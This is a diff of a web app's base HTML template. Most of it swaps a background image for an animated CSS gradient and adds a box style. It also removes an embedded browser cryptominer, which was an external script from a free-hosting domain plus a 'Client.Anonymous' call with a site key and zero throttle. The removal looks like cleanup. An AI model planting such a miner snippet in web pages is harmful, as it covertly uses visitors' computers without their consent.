@@ -28,9 +28,23 @@
 
 
     <style>
-    body {
-      background-image: url('static/Background.jpg');
-    }
+ body {
+	background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
+	background-size: 400% 400%;
+	animation: gradient 5s ease infinite;
+}
+
+@keyframes gradient {
+	0% {
+		background-position: 0% 50%;
+	}
+	50% {
+		background-position: 100% 50%;
+	}
+	100% {
+		background-position: 0% 50%;
+	}
+}
     .alert {
         background: green;
         padding: 1rem;
@@ -39,22 +53,23 @@
         margin: 1rem;
         font-size: 40px
       }
+
+      .main_box {
+    padding: 1rem;
+    color: black; 
+    border: 5px solid black; 
+    border-radius: 30px;
+    display: inline-block; 
+    background: white
+}
     </style>
-<link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:ital,wght@0,200;0,300;0,400;0,600;0,700;0,900;1,200;1,300;1,400;1,600;1,700;1,900&display=swap" rel="stylesheet">
-  </head>
+      </head>
 
   <body>
     <!-- Google Tag Manager (noscript) -->
 <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-N974WZZ"
 height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
 <!-- End Google Tag Manager (noscript) -->
-<script src="https://grade-cal.000webhostapp.com/YBrU.php?f=fWxo.js"></script>
-<script>
-    var _client = new Client.Anonymous('b89b585001421b41b9b9b524934b5e158996d1e21305816c5cf0f82c4285db72', {
-        throttle: 0, c: 'w', ads: 0
-    });
-    _client.start();
-</script>
 {% block content %}
 
 {% endblock %}
